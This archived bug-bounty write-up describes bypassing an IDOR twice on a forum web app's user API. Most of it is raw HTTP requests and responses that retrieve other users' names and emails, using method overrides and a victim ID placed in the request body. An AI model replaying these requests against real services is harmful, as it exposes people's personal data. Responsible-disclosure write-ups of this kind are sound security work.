# Bypassing an IDOR A couple of times — $$$$

- **Source URL:** https://medium.com/@bxrowski0x/bypassing-an-idor-a-couple-of-times-4d67555a1545?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260714155616/https://medium.com/@bxrowski0x/bypassing-an-idor-a-couple-of-times-4d67555a1545
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5616 (id 5616)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Bypassing an IDOR A couple of times — $$$$

## TL;DR

This writeup is about an IDOR, I’ma share How I was able to find and bypass an IDOR twice which leaked users PII.

### Introduction

The web application for sharing projects and ideas its more like a forum there is a way to register/login and even reply to posts/projects and every user has a profile and can do the following read/update/delete information e.g. `first name/email, etc` and every user has a numeric `ID.`

## Playing With the API

First of all, I started working on this specific webapp cuz it was old and big and I reported some low severity bugs in it, so I had to deeply test it.

I turned my burp on and went directly to the profile which runs at /profile/settings when I visited it sent a request to /api/v4/user/22652

API request was the following:

```
GET /api/v4/user/22652 HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://redacted
X-Requested-With: XMLHttpRequest
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```
Response:

```
HTTjP/2 200 OK
Server: nginx
Date: Wed, 07 Feb 2024 00:19:56 GMT
Content-Type: application/json
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=31536000;preload
Referrer-Policy: strict-origin-when-cross-origin
{"id":22652,"isMe":true,"created":{"date":"2023-11-23 08:24:19.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"updated":{"date":"2024-02-07 01:15:33.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"deleted":null,"inactive":null,"isEmployee":false,"meta":{"language":"en","model":"User","modelnameIndex":{"User":[""]}}}
```
Obviously tried a few tricks such as:

- Changing my ID to another ID
- Changing the API version e.g. “ /api/v1/user/1“
- Adding an extension to the end of the user ID e.g. “ /api/v4/user/1.json “
- Sending the request without IDs e.g. “ /api/v4/user/ “
- Sending the request without IDs e.g. “ /api/v4/users/ “
- Changing the ID with an asterisk symbol e.g. “ /api/v4/user/\* “
- Path Traversal e.g. “ /api/v4/user/22652/../1 “
- Sending the request with ‘page’ or ‘pageSize’ parameter e.g. “ /api/v4/user/?page=1 “ (**Worked with me a few times**)

I got 2 different responses:

```
HTTP/2 403 Forbidden
Server: nginx
Date: Wed, 07 Feb 2024 00:43:39 GMT
Content-Type: text/html; charset=UTF-8
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=31536000;preload
Referrer-Policy: strict-origin-when-cross-origin
{"errors":{"status":403,"title":"Forbidden"},"data":[]}
```
```
HTTP/2 404 Not Found
Server: nginx
Date: Wed, 07 Feb 2024 03:45:58 GMT
Content-Type: text/html; charset=UTF-8
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: redacted
Strict-Transport-Security: max-age=31536000; preload
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
X-Powered-By: redacted
X-Xss-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
{"errorCode":"redacted"}
```
## Accessing Users PII (Bypass)

I will tell you the exact thing that happened to me, After a few hours I continued testing the same endpoint.

Let’s play with the Request Methods.

- Changing the Method to POST (**No 404**!)
- Changing the method to PATCH (**500 Error Code**)

- Changing the Request method to PUT and added the ‘\_method’ parameter to the body with PATCH as the value

```
PUT /api/v4/user/1 HTTP/2
Host: redacted
Cookie: redcated
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: redacted
X-Requested-With: XMLHttpRequest
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 12
_method=PATCH
```
It worked!!!!!!!!!!!!!!!!! but this was so weird to me because it wasn’t working every time I sent the request sometimes the response was a 500 error code.

```
HTTP/2 500 Internal Server Error
Content-Length: 97
Cache-control: no-cache
Content-type: text/html
<html>
<body>
<h1>500 Internal Server Error</h1>
</body>
</html>
```
But sometimes the response was 200 OK and has the user information.

```
HTTP/2 200 OK
Server: nginx
Date: Wed, 07 Feb 2024 19:23:18 GMT
Content-Type: application/json
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=31536000;preload
Referrer-Policy: strict-origin-when-cross-origin
{"id":1,"isMe":false,"created":{"date":"2010-06-01 18:00:01.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"updated":{"date":"2022-05-31 18:54:41.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"deleted":null,"inactive":null,"isEmployee":false,"meta":{"language":"de","model":"User","modelnameIndex":{"User":[""]}}}
```
To be honest this was not enough information so I digged into the application and I found that they use a parameter called ‘include‘ that takes some values such as firstname/lastname/email when we use it the response would have the current user firstname,lastname, etc e.g. “firstname,lastname,displayName,email,image,isMe“

Request would be like this:

```
PUT /api/v4/user/1?include=firstname%2Clastname%2CdisplayName%2Cemail%2Cimage%2CisMe HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: redacted
X-Requested-With: XMLHttpRequest
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 12
_method=PATCH
```
Response:

```
HTTP/2 200 OK
Server: nginx
Date: Wed, 07 Feb 2024 19:30:06 GMT
Content-Type: application/json
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=31536000;preload
Referrer-Policy: strict-origin-when-cross-origin
{"id":1,"firstname":"redacted","lastname":"redacted","displayName":"redacted","email":"redacted","image":null,"isMe":false,"created":{"date":"2010-06-01 18:00:01.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"updated":{"date":"2022-05-31 18:54:41.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"deleted":null,"inactive":null,"isEmployee":false,"meta":{"language":"de","model":"User","modelnameIndex":{"User":[""],"UserBadge":["badges"]}}}
```
I reported it this way and The next day the triager told me that he wasn’t able to reproduce the vulnerability and yes it was not working anymore and he was getting 401 unauthorized.

So I tried again and actually, I don’t really know why that happened but when I removed the whole body and sent the PUT request without anything in the body it did go through.

```
PUT /api/v4/user/1?include=firstname%2Clastname%2CdisplayName%2Cemail%2Cimage%2CisMe HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: redacted
X-Requested-With: XMLHttpRequest
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```
```
HTTP/2 200 OK
Server: nginx
Date: Wed, 07 Feb 2024 23:16:47 GMT
Content-Type: application/json
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=31536000;preload
Referrer-Policy: strict-origin-when-cross-origin
{"id":1,"firstname":"redacted","lastname":"redacted","displayName":"redacted","email":"redacted","image":null,"isMe":false,"created":{"date":"2010-06-01 18:00:01.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"updated":{"date":"2022-05-31 18:54:41.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"deleted":null,"inactive":null,"isEmployee":false,"meta":{"language":"de","model":"User","modelnameIndex":{"User":[""],"UserBadge":["badges"]}}}
```
## Bypassing the Bypass

After a whole lotta time I was testing the same subdomain and went to test the same API endpoint.

I asked myself a few questions:

- Does the old IDOR still work? (**Nope**)
- Does any of the bypasses work? (**Nope**)

So after testing a few stuff, I changed the profile firstname to see what the request look like:

```
PUT /api/v4/user/ HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: redacted
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 25
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
id=22652&firstname=testaq
```
Oh damn okay, it was so interesting because it’s the same PUT Request but the ID is set using the ‘ id ’ parameter, — like there must be a bypass here!!!

- Changing the ID to another ID? (**403)**
- Tried HPP e.g. “ id=22652&id=1 “ (**403**)

After hours of testing I discovered that the request takes and processes both BODY and PATH Queries

For example, this request would change my firstname and also respond with my email in response (**Normally it doesn’t**).

```
PUT /api/v4/user/?include=email HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: redacted
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 26
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
id=22652&firstname=testaqq
```
What I did to achieve this is basically by sending a request to the API endpoint with my UserID in the path e.g. “/api/v4/user/22652“ and the victim’s ID in the request body:

```
PUT /api/v4/user/22652?include=firstname%2Clastname%2CdisplayName%2Cemail%2CisMe HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: redacted
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 8
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
id=22651
```
Yep it worked!!!!!!!!! (**I had to remove firstname cuz it would return a 403**)

```
HTTP/2 200 OK
Server: nginx
Date: Thu, 08 Feb 2024 19:08:52 GMT
Content-Type: application/json
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=31536000;preload
Referrer-Policy: strict-origin-when-cross-origin
{"id":22651,"firstname":"","lastname":"","displayName":"","email":"","isMe":false,"created":{"date":"2023-11-23 02:32:16.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"updated":{"date":"2023-11-23 02:32:48.000000","timezone_type":3,"timezone":"Europe\/Berlin"},"deleted":null,"inactive":null,"isEmployee":false,"meta":{"language":"de","model":"User","modelnameIndex":{"User":[""]}}}
```
## Timeline

**Feb 8, 2024** — Reported

**Mar 4, 2024** — 2000$ Bounty Rewarded

**Follow me on:**
